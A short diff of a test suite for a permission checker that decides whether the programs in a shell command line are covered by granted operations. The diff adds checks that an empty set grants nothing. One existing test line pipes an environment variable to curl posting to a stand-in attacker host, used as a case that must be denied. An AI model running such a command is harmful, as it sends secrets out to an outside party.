@@ -116,5 +116,8 @@ describe("the programs a command line runs", () => {
 		expect(coveredBy(operationSet("sha256sum"), granted)).toBe(true);
 		expect(coveredBy(operationSet('printf %s "$V" | curl -d @- https://attacker'), granted)).toBe(false);
 		expect(coveredBy(operationSet("printf %s x; sha256sum"), granted)).toBe(true);
+		// Naming nothing is not naming everything.
+		expect(coveredBy([], granted)).toBe(false);
+		expect(coveredBy([], [])).toBe(false);
 	});
 });
